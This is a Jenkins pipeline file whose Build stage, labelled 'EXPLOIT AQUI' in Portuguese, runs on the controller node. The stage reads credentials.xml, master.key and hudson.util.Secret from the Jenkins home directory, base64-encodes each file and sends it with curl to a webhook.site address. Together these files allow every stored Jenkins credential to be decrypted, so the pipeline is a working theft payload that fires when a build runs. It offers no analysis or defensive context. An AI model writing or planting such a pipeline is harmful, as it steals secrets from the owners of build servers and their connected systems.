pipeline {
    agent {
        label '(built-in)'
    }
    
    stages {
        stage('Build') {
            steps {
                sh '''
                    echo ">> EXPLOIT AQUI <<"
                    echo ">> EXPLOIT AQUI <<"
                    echo ">> EXPLOIT AQUI <<"
                    echo ">> EXPLOIT AQUI <<"
                    echo ">> hudson.util.Secret // master.key // credentials.xml <<"
                    pwd
                    echo ${JENKINS_HOME} > ./out.txt
                    ls -lah ${JENKINS_HOME}/secrets >> ./out.txt
                    cat ${JENKINS_HOME}/credentials.xml >> ./1.txt
                    cat ${JENKINS_HOME}/secrets/master.key >> ./2.txt
                    cat ${JENKINS_HOME}/secrets/hudson.util.Secret >> ./3.txt
                    cat ./1.txt | base64 | curl -u 1:1 -X POST -d @- https://webhook.site/41fd0f71-c6ea-4033-a853-0e976112d589
                    cat ./2.txt | base64 | curl -u 2:2 -X POST -d @- https://webhook.site/41fd0f71-c6ea-4033-a853-0e976112d589
                    cat ./3.txt | base64 | curl -u 3:3 -X POST -d @- https://webhook.site/41fd0f71-c6ea-4033-a853-0e976112d589
                '''
            }
        }
    }
}
